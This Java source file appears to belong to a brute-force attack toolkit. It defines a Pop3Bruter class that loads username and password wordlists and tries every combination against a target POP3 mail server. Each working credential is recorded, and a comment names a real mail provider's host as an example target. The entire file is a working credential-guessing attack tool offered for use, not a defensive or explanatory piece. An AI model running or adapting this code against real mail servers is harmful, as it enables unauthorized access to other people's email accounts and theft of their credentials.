package action.bruter;

import global.GlobalSetting;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Properties;

import javax.mail.Folder;
import javax.mail.Session;
import javax.mail.Store;
import javax.mail.Transport;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.smtp.SMTPClient;

import ch.ethz.ssh2.Connection;
import tools.Logger;

public class Pop3Bruter {
	public static final int DEFAULT_PORT = 110;
	private static ArrayList<String> userlist = new ArrayList<String>();
	private static ArrayList<String> passlist = new ArrayList<String>();
	private static Properties props = null;
	
	//pop3.163.com
	public void run(String target) {
		if (!getUserPass()) {
			Logger.getInstance().insertLog("Error", "Pop3Bruter getUserPass error!");
			return;
		}
		
		props = System.getProperties();  
        props.setProperty("mail.pop3.host", target);  
        props.setProperty("mail.pop3.port", String.valueOf(DEFAULT_PORT));  
        props.setProperty("mail.store.protocol", "pop3");  
		
		for (int i=0; i<userlist.size(); i++)
			for (int j=0; j<passlist.size(); j++) 
				checkLogin(target, userlist.get(i), passlist.get(j));
	}
	
	private void checkLogin(String target, String username, String password) {
		Store store = null;
		Folder folder = null;
		try {
			Session session = Session.getInstance(props);  
			store = (Store)session.getStore("pop3");  
            store.connect(target, username, password); 
			store.close();
			
			Logger.getInstance().insertResult(target+":"+username+":"+password);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			return;
		}
	}
	
	private boolean getUserPass() {
		if (userlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\pop3_user.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	userlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}	
		}
		
		if (passlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\pop3_pass.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	passlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}
		}
		
		return true;
	}
}
